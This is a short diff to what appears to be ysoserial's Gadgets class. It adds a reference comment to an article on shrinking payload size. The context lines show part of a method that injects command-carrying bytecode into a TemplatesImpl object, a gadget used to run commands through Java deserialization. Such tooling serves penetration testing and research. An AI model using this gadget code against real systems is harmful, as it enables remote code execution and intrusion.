@@ -134,7 +134,7 @@ public class Gadgets {
         return templates;
     }
 
-
+    // Reference: 《缩小ysoserial payload体积的几个方法》 https://xz.aliyun.com/t/6227
     public static Object createCompressTemplatesImpl(final String command) throws Exception {
         TemplatesImpl templates = TemplatesImpl.class.newInstance();
         byte[] classBytes = null;
@@ -157,6 +157,7 @@ public class Gadgets {
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
         Reflections.setFieldValue(templates, "_name", "P");
+
         classPool.getCtClass("C").defrost();
         return templates;
     }
